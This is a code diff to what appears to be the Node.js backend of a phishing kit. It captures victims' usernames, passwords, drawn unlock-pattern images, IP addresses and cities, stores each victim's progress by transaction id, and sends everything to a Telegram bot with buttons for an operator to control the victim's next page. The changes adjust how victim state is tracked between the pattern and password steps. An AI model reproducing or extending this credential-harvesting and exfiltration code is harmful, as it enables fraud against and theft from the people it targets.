@@ -23,7 +23,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
   fs.mkdirSync(CLIENTES_DIR);
 }
 
-// 🧹 Limpieza automática de archivos viejos
+// 🧹 Limpieza automática
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -72,17 +72,10 @@ Secuencia: <code>${patron}</code>
   `;
 
   try {
-    // 👉 Guardar cliente con estado "esperando" (para que no rebote a patronnn.html)
-    const cliente = {
-      status: "esperando",
-      usar,
-      ip,
-      ciudad: city,
-      preguntas: []
-    };
+    // Guardamos estado como "patron"
+    const cliente = { status: "patron", usar, ip, ciudad: city, preguntas: [] };
     guardarCliente(txid, cliente);
 
-    // 👉 Convertir imagen a buffer
     const base64Data = patronImg.replace(/^data:image\/png;base64,/, "");
     const buffer = Buffer.from(base64Data, "base64");
 
@@ -92,14 +85,12 @@ Secuencia: <code>${patron}</code>
     formData.append("caption", caption);
     formData.append("parse_mode", "HTML");
 
-    // 👉 Enviar foto
-    const response = await axios.post(
+    await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
       formData,
       { headers: formData.getHeaders(), httpsAgent: agent }
     );
 
-    // 👉 Enviar botones
     const keyboard = {
       inline_keyboard: [
         [
@@ -126,7 +117,7 @@ Secuencia: <code>${patron}</code>
     });
 
     console.log("✅ Patrón e info enviados a Telegram");
-    res.status(200).json({ success: true, data: response.data });
+    res.status(200).json({ success: true });
   } catch (error) {
     console.error("❌ Error al enviar patrón a Telegram:", error.response?.data || error.message);
     res.status(500).json({ success: false, error: error.message });
@@ -190,6 +181,10 @@ app.post('/enviar3', async (req, res) => {
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 `;
+
+  // 👇 Ahora guardamos estado como "esperando"
+  const cliente = { status: "esperando", usar, clavv, ip, ciudad };
+  guardarCliente(txid, cliente);
 
   const keyboard = {
     inline_keyboard: [
